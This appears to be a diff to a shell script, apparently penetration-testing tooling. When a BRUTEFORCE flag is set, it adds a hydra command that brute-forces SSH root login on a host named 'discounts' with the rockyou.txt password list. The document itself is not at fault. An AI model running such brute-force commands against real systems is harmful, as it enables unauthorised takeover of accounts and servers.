@@ -25,7 +25,8 @@ fi
 
 if  [ "${BRUTEFORCE}" = true ];
 then
-echo "I invoked BRUTEFORCE"
+echo "I invoked hydra!"
+hydra discounts ssh -l root -P /usr/share/wordlists/rockyou.txt -s 22 -vV
 fi
 
 
